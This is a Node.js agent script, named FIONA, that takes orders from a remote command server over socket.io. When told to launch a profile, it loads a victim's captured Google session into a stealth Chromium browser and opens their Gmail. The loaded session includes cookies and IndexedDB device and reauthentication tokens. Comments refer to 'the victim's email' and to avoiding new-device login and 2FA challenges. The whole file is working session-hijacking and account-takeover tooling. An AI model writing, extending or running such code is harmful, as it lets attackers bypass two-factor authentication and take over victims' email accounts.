'use strict';
require('dotenv').config();
const { chromium } = require('patchright');
const { io } = require('socket.io-client');
const os = require('os');
const path = require('path');
const fs = require('fs');

const { SERVER_URL, AGENT_EMAIL, AGENT_PASSWORD } = process.env;

if (!SERVER_URL || !AGENT_EMAIL || !AGENT_PASSWORD) {
  console.error('[FIONA] Missing .env values.');
  process.exit(1);
}

const activeBrowsers = new Map();
const launching = new Set();

async function launchProfile({ profileId, email, userId, browserState }) {
  const profileDir = path.join(os.tmpdir(), 'fiona-profiles', profileId);

  if (process.platform === 'win32') {
    try {
      const { execSync } = require('child_process');
      execSync(
        `wmic process where "name='chrome.exe' and commandline like '%${profileId}%'" call terminate`,
        { stdio: 'ignore', timeout: 5000 }
      );
      await new Promise(r => setTimeout(r, 1200));
    } catch (_) {}
  }
  if (fs.existsSync(profileDir)) {
    fs.rmSync(profileDir, { recursive: true, force: true });
  }
  fs.mkdirSync(profileDir, { recursive: true });

  // ── Parse VPS browser state ───────────────────────────────────────────────
  let playwrightState = null;  // { cookies, origins } — Playwright storageState
  let accountsIdb     = null;  // accounts.google.com IndexedDB (web RAPT lives here)
  if (browserState) {
    try {
      const parsed  = JSON.parse(browserState);
      playwrightState = parsed.playwrightState || null;
      accountsIdb     = parsed.accountsIdb     || null;
    } catch (e) {
      console.error('[FIONA] browserState parse failed:', e.message);
    }
  }

  // ── Pre-seed Chrome profile display info ─────────────────────────────────
  // Write account metadata into Local State BEFORE launch so Chrome
  // shows the victim's email in the profile icon immediately.
  // No web sign-in flow, no new-device login, no 2FA challenge.
  const localDisplayName = email.split('@')[0].replace(/[._]/g, ' ');
  const localState = {
    profile: {
      info_cache: {
        Default: {
          active_time: Date.now() / 1000,
          avatar_icon: 'chrome://theme/IDR_PROFILE_AVATAR_26',
          gaia_given_name: localDisplayName,
          gaia_id: '',
          gaia_name: localDisplayName,
          hosted_domain: '',
          is_consented_primary_account: false,
          is_ephemeral: false,
          is_using_default_avatar: true,
          is_using_default_name: false,
          name: localDisplayName,
          shortcut_name: localDisplayName,
          user_name: email,
        },
      },
      last_active_profiles: ['Default'],
      profiles_created: 1,
    },
  };
  const defaultDir = path.join(profileDir, 'Default');
  fs.mkdirSync(defaultDir, { recursive: true });
  fs.writeFileSync(
    path.join(profileDir, 'Local State'),
    JSON.stringify(localState, null, 2)
  );

  // ── Launch Chromium ───────────────────────────────────────────────────────
  // storageState restores cookies AND localStorage for all origins atomically.
  // ignoreDefaultArgs removed — it was stripping --disable-sync (Playwright's
  // own default), which ENABLED Chrome sync and caused the "Sign in" dialog.
  const context = await chromium.launchPersistentContext(profileDir, {
    headless: false,
    viewport: { width: 1280, height: 800 },
    args: [
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-sync',
      '--disable-background-networking',
    ],
  });

  // Inject cookies manually — storageState is unreliable in launchPersistentContext.
  // context.addCookies() goes directly to the browser's cookie store via CDP.
  if (playwrightState?.cookies?.length) {
    try {
      await context.addCookies(playwrightState.cookies);
      console.log(`[FIONA] ${playwrightState.cookies.length} cookies injected`);
    } catch (cookieErr) {
      console.error('[FIONA] Cookie injection error:', cookieErr.message);
    }
  } else {
    console.warn('[FIONA] No cookies to inject — browserState missing or empty');
  }

  // Use the default blank tab Chrome opens at launch
  const pages = context.pages();
  const firstTab = pages.length > 0 ? pages[0] : await context.newPage();

  // Navigate to accounts.google.com to restore IndexedDB (web RAPT, device tokens).
  // cookies + localStorage are already set via storageState above, so this page
  // loads as the authenticated user. We then write the captured IDB data back.
  await firstTab.goto('https://accounts.google.com', {
    waitUntil: 'networkidle',
    timeout: 20000,
  }).catch(() => {});

  if (accountsIdb && Object.keys(accountsIdb).length > 0) {
    await firstTab.evaluate(async (idb) => {
      for (const [dbName, dbInfo] of Object.entries(idb)) {
        try {
          const db = await new Promise((res, rej) => {
            const req = indexedDB.open(dbName, dbInfo.version);
            req.onupgradeneeded = () => {};
            req.onsuccess = () => res(req.result);
            req.onerror   = () => rej(req.error);
          });
          for (const [storeName, records] of Object.entries(dbInfo.stores)) {
            try {
              const tx    = db.transaction(storeName, 'readwrite');
              const store = tx.objectStore(storeName);
              for (const record of records) { store.put(record); }
              await new Promise(res => { tx.oncomplete = res; tx.onerror = res; });
            } catch (_) {}
          }
          db.close();
        } catch (_) {}
      }
    }, accountsIdb).catch(e => console.warn('[FIONA] IDB restore warn:', e.message));
    console.log(`[FIONA] IndexedDB restored — ${Object.keys(accountsIdb).length} databases`);
  }

  // Open Gmail in a new tab
  const gmailTab = await context.newPage();
  await gmailTab.goto('https://mail.google.com', {
    waitUntil: 'domcontentloaded',
    timeout: 30000,
  });

  // Bring Gmail tab to front
  await gmailTab.bringToFront();
  await gmailTab.waitForTimeout(3000);

  const finalUrl   = gmailTab.url();
  const pageTitle  = await gmailTab.title();
  console.log(`[FIONA] Gmail URL:   ${finalUrl}`);
  console.log(`[FIONA] Gmail title: ${pageTitle}`);

  const authenticated =
    pageTitle.toLowerCase().includes('inbox') ||
    pageTitle.includes('@gmail.com') ||
    (finalUrl.includes('mail.google.com') &&
      !finalUrl.includes('/signin') &&
      !finalUrl.includes('/ServiceLogin'));

  activeBrowsers.set(profileId, { context, userId });

  context.on('close', () => {
    activeBrowsers.delete(profileId);
    launching.delete(profileId);
    try {
      fs.rmSync(profileDir, { recursive: true, force: true });
    } catch (err) {
      console.warn(`[FIONA] Cleanup warning (non-fatal): ${err.message}`);
    }
    console.log(`[FIONA] Browser closed: ${profileId}`);
  });

  console.log(`[FIONA] Launched: ${email} — authenticated: ${authenticated}`);
  return authenticated;
}

async function main() {
  console.log(`[FIONA] Authenticating as ${AGENT_EMAIL}...`);
  const loginRes = await fetch(`${SERVER_URL}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: AGENT_EMAIL, password: AGENT_PASSWORD }),
  });

  const loginData = await loginRes.json();
  if (!loginData.success) {
    console.error('[FIONA] Login failed:', loginData.error || 'Unknown error');
    process.exit(1);
  }

  const userId = loginData.user?.id;
  if (!userId) {
    console.error('[FIONA] Login response missing user.id');
    process.exit(1);
  }
  console.log(`[FIONA] Authenticated — userId: ${userId}`);

  const socket = io(SERVER_URL, {
    transports: ['websocket', 'polling'],
    reconnection: true,
    reconnectionDelay: 3000,
    reconnectionAttempts: Infinity,
  });

  socket.on('connect', () => {
    console.log('[FIONA] Socket connected — registering agent...');
    socket.emit('agent-ready', { userId });
  });

  socket.on('agent-ack', () => {
    console.log('[FIONA] ✓ Agent ready. Waiting for launch commands...');
  });

  socket.on('launch-profile', async ({ profileId, email, userId: uid, browserState }) => {
    if (activeBrowsers.has(profileId)) {
      console.log(`[FIONA] Already running: ${email}`);
      socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated: true, email });
      return;
    }

    if (launching.has(profileId)) {
      console.log(`[FIONA] Already launching: ${email} — ignoring duplicate`);
      return;
    }
    launching.add(profileId);

    console.log(`[FIONA] Launch command received: ${email}`);
    try {
      const authenticated = await launchProfile({ profileId, email, userId: uid, browserState });
      socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated, email });
    } catch (err) {
      console.error('[FIONA] Launch error:', err.message);
      launching.delete(profileId);
      socket.emit('launch-result', { profileId, userId: uid, success: false, authenticated: false, email, error: err.message });
    }
  });

  socket.on('close-profile', async ({ profileId, userId: uid }) => {
    const entry = activeBrowsers.get(profileId);
    if (entry) {
      await entry.context.close().catch(() => {});
      activeBrowsers.delete(profileId);
      launching.delete(profileId);
      console.log(`[FIONA] Profile closed: ${profileId}`);
      socket.emit('close-result', { profileId, userId: uid, success: true });
    } else {
      socket.emit('close-result', { profileId, userId: uid, success: false });
    }
  });

  socket.on('disconnect', (reason) => {
    console.warn('[FIONA] Disconnected:', reason, '— reconnecting...');
  });

  socket.on('connect_error', (err) => {
    console.error('[FIONA] Connection error:', err.message);
  });
}

main().catch((err) => {
  console.error('[FIONA] Fatal:', err.message);
  process.exit(1);
});
